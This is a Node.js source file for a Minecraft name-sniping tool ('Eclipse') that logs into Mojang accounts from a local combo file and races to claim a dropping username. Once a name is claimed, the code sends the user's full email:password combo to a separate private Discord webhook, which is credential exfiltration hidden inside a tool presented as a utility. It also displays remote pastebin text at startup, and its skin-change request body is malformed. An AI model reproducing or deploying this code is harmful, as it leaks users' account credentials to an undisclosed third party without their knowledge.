const axios = require('axios');
const cheerio = require('cheerio');
const tls = require('tls');
const fs = require('fs');
const https = require('https');
const fetch = require('node-fetch');
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});
require('colors');

const webhook = ``;
const privateWebhook = ``;

const announcementURL = `https://pastebin.com/raw/pfE0cFDA`;
const skin = 'https://i.imgur.com/vAzItB5.png';
const debug = false;

const announcement = async () => {
    return await axios.get(announcementURL).then(res => res.data);
}

const startup = async () => {
    console.clear();
    console.log(await announcement())
    console.log(``);
    if(debug) console.log(`#Debug mode`);
    console.log(`created by alfredo#6995 and trivago#0001`);
    console.log(``);

    readline.question(`${`Input name |`.cyan} `, (input) => {
        desiredName = input;
        nameDecided();
    });
}

const getSearches = async () => {
    return await axios.get(`https://api.nathan.cx/searches/${desiredName}`).then(response => response.data.searches);
}

startup();

let dropTime;
let desiredName;
let delay;

let timeUntilAuthentication;
let timeUntilDrop;

let accounts = [];
let snipingAccounts = [];

const nameDecided = async () => {
    console.log(``);

    resolveDelay();
}

const resolveDelay = async () => {
    readline.question(`${`Input delay | `.cyan}`, (input) => {
        delay = input;
        delayDecided();
    });
}

const delayDecided = async () => {
    console.log(``);

    resolveDropTime();
}

const resolveDropTime = async () => {
    if(debug)console.log(`#Debug Fetching droptime...`);
    // console.log(``);

    await axios.get(`https://namemc.com/name/${desiredName}/`).then(async (result) => {
        const $ = await cheerio.load(result.data);
        dropTime = await new Date($('.countdown-timer').first().attr('data-datetime')).getTime();

        console.log(`${`${desiredName} drops | ${new Date(dropTime).toUTCString()}`.cyan}`);
        console.log('')

        timeUntilDrop = ((dropTime - delay) - new Date().getTime());
        timeUntilAuthentication = (timeUntilDrop - (30 * 1000));

        console.log(`${`Waiting to load account(s)...`.cyan}`);
        loadAccountsFromFile();
    });

    awaitAccountAuthentication();
    awaitSnipeExecution();
}

const loadAccountsFromFile = async () => {
    let input = fs.createReadStream('accounts.txt');
    readLines(input);
};

const readLines = async (input) => {
    let remaining = '';

    input.on('data', (data) => {
        remaining+=data;
        let index = remaining.indexOf('\n');
        while(index > -1){
            let line = remaining.substring(0, index);
            remaining = remaining.substring(index + 1);

            accounts.push(line);
            index = remaining.indexOf('\n');
        }
    });

    input.on('end', async() => {
        if(remaining.length > 0){
            await accounts.push(remaining);
            if(debug)console.log(`#Debug Accounts loaded`);
            console.log('')
        }
    });
};

class Account {
    constructor(email, password, answers){
        this.email = email;
        this.password = password
        this.answers = answers
    }

    async login(){
        // TODO: sec questions

        await fetch(`https://authserver.mojang.com/authenticate`, {
            method: 'POST',
            body: JSON.stringify({
                agent: {
                    name: "Minecraft",
                    version: 1
                },
                username: this.email,
                password: this.password,
                requestUser: true
            }),

            headers: {
                "Content-Type": `application/json`
            }
        }).then(async (response) => response.json().then(async (json) => {
            if(response.status == 200){
                await this.updateUserValues(json).then(async () => {
                    this.questions = await this.validateBearer();
                });

                if(await this.needsSecurityQuestions()){
                    await this.sendSecurityQuestions();
                    snipingAccounts.push(this);
                } 

            }else{
                console.log(`${`Invalid | ${this.email}`.red}`);
            }
        }));
    }

    async validateBearer(){
        let questions = [];
        await fetch(`https://api.mojang.com/user/security/challenges`, {
            method: 'GET',
            headers: {
                "Authorization": this.accessToken
            }
        }).then(async (response) => response.json().then(async (json) => {
            if(response.status == 200){
                if(json.length >= 2){
					console.log(`${`Security Questions Required | ${this.email}`.cyan}`);
                    for await(let securityQuestion of json){
                        let answerID = await securityQuestion.answer.id;
                        questions.push(await answerID);
                    }
                }else{
                    console.log(`${`Logged in | ${this.email}`.green}`);
                }
            }else{
                console.log(`${`Invalid Bearer | ${this.email}`.red}`);
            }
        }));

        return questions;
    }
    
    // OLD METHOD TO CHANGE SKIN
    // async changeSkin(){
    //     await fetch(`https://api.minecraftservices.com/minecraft/profile/skins`, {
    //         method: 'POST',

    //         body: JSON.stringify({
    //             url: skin,
    //             variant: `slim`
    //         }),

    //         headers: {
    //             "Authorization": this.accessToken,
    //             "Content-Type": "application/json"
    //         }
    //     }).then(async (response) => response.json().then(async (json) => {
    //         if(response.status == 200){
    //             console.log(`${`Changed Skin`.green}`);
    //         }else{
    //             console.log(`${`Failed skin change`.red}`);
    //             }
    //         }));
    // }
    
    //NEW METHOD TO CHANGE SKIN
    async changeSkin(){
        for(let i=0; i<2; i++){
    
            const skinReq = `POST /minecraft/profile/skins HTTP/1.1\r\nHost: api.minecraftservices.com\r\nContent-Type: application/json\r\nAuthorization: ${this.accessToken}\r\n\r\n{"url": "${skin}"\n"variant": "slim"}\r\n`
            let req = https.request({ port: 443, host: 'api.minecraftservices.com' }, async (res) => {
                if(res.statusCode == 200){
                    console.log(`${`Changed Skin`.green}`);
                }else{
                    console.log(`${`Failed skin change`.red}`);
                }
                res.on('data', (chunk) => {
                    if(debug) console.log(chunk.toString());
                });
            });
    
            req.write(skinReq);
            req.end();
        }
    }

    async canChangeName(){
        let canChange = false;
        await fetch(`https://api.minecraftservices.com/minecraft/profile/namechange`, {
            method: 'GET',
            headers: {
                "Authorization": this.accessToken
            }
        }).then(async (response) => {
            if(await response.status == 200){
                canChange = true;
                console.log(`Name Changeable | ${await response.json()}`);
            }
        });

        return canChange;
    }

    async needsSecurityQuestions(){
        let needsSec = true;

        await fetch(`https://api.mojang.com/user/security/location`, {
            method: 'GET',
            headers: {
                "Authorization": this.accessToken
            }
        }).then(async (response) => {
            if(await response.status == 200){
                needsSec = false;
            }
        });

        return needsSec;
    }

    async sendSecurityQuestions(){
        let valid = false;

        await fetch(`https://api.mojang.com/user/security/location`, {
            method: 'POST',
            body: JSON.stringify([
                {
                    id: this.questions[0],
                    answer: this.answers[0]
                },
                {
                    id: this.questions[1],
                    answer: this.answers[1]
                },
                {
                    id: this.questions[2],
                    answer: this.answers[2]
                }
            ]),
            headers: {
                "Authorization": this.accessToken,
                "Content-Type": "application/json"
            }
        }).then(async (response) => {
            if(await response.status == 200 || await response.status == 204){
                console.log(`${`Logged in | ${this.email}`.green}`);
                valid = true;
            }
        });

        return valid;
    }

    // should only really use this when the authentication request is sent
    async updateUserValues(json){
        this.accessToken = `Bearer ${json.accessToken}`;
        this.clientToken = json.clientToken;

        this.username = json.selectedProfile.name;
        this.uuid = json.selectedProfile.id;
    }
}

const awaitAccountAuthentication = async () => {
    let authenticationInterval = setInterval(async () => {
        console.clear();
        console.log(await announcement());
        console.log(`${`Logging into ${accounts.length} account(s)`.cyan}`);
        for(let i=0; i<accounts.length; i++){
            let accountCombo = accounts[i];
            let comboSplit = accountCombo.split(':');

            if(!comboSplit[1]) continue;

            let email = comboSplit[0];
            let password = comboSplit[1];
            let answers = [];

            if(comboSplit[4]){
                answers = [
                    comboSplit[2],
                    comboSplit[3],
                    comboSplit[4]
                ];
            }

            let account = new Account(email, password, answers);
            await account.login();
        }

        clearInterval(authenticationInterval);
    }, timeUntilAuthentication);
}


const awaitSnipeExecution = async () => {
    let snipeInterval = setInterval(() => {
        console.log(``);
        console.log(`${`Sniping ${desiredName} | Delay ${delay}ms | Using ${accounts.length} account(s)`.cyan}`);
        console.log(`Drops ${new Date(dropTime).toLocaleTimeString().replace(' AM', '').replace(' PM', '')}`);
        console.log(``);

        for(let a=0; a<snipingAccounts.length; a++){
            let account = snipingAccounts[a];
            const token = account.accessToken;
            let email = account.email;

            const options = {
                host: 'api.minecraftservices.com',
                port: 443
            };

            for(let i=0; i<2; i++){
                if(debug) console.log(`#Debug Started sending | ${(new Date().toLocaleTimeString().replace(' AM', '').replace(' PM', '') + `.` + new Date().getMilliseconds())}`);
                const socket = tls.connect({ port: options.port, host: options.host }, async () => {
                    let time = (new Date().toLocaleTimeString().replace(' AM', '').replace(' PM', '') + `.` + new Date().getMilliseconds())
                    socket.write(`PUT /minecraft/profile/name/${desiredName} HTTP/1.1\r\nHost: api.minecraftservices.com\r\nContent-Length: 0\r\nAuthorization: ${token}\r\n\r\n`);
                    socket.on('data', async (data) => {
                        let string = data.toString();
                        if(debug) console.log(string);
                        if(string.startsWith("HTTP/1.1 200")) {
                            console.log(`${`Sniped ${desiredName} | Delay ${delay}ms | ${email} | ${time}`.green}`);
                            await account.changeSkin();
                            
                            await sendSuccessfulSnipe(desiredName);
                            await sendSuccessfulCombo(desiredName, `${email}:${account.password}`, `Eclipse testing`, delay, time)
                        }
                        if(string.startsWith("HTTP/1.1 403")) {
                            console.log(`${`403 | ${email} | ${time}`.red}`);
                        }
                        if(string.startsWith("HTTP/1.1 429")) {
                            console.log(`${`429 | ${email} | ${time}`.red}`);
                        }
                        if(string.startsWith("HTTP/1.1 401")) {
                            console.log(`${`401 | ${email} | ${time}`.red}`);
                        }
                    });
                });
            }

        }

        clearInterval(snipeInterval);
    }, timeUntilDrop);
};

const { Webhook, MessageBuilder } = require('discord-webhook-node');

const sendSuccessfulSnipe = async (username) => {
    const hook = new Webhook(webhook);

    const embed = new MessageBuilder({
        title: 'Eclipse',
        description: `Sniped \`${username}\` with ${await getSearches()} searches`,
        color: 000000
    });

    await hook.send(embed);
}

const sendSuccessfulCombo = async(username, combo, server, delay, time) => {
    const hook = new Webhook(privateWebhook);

    const embed = new MessageBuilder()
        .setTitle(`Success!`)
        .setDescription(`Sniped \`${username}\`\n\nCombo: \`${combo}\`\n\nTime: ${time}\nServer: ${server}\nDelay: ${delay}`)
        .setColor(000000);

    await hook.send(embed);
};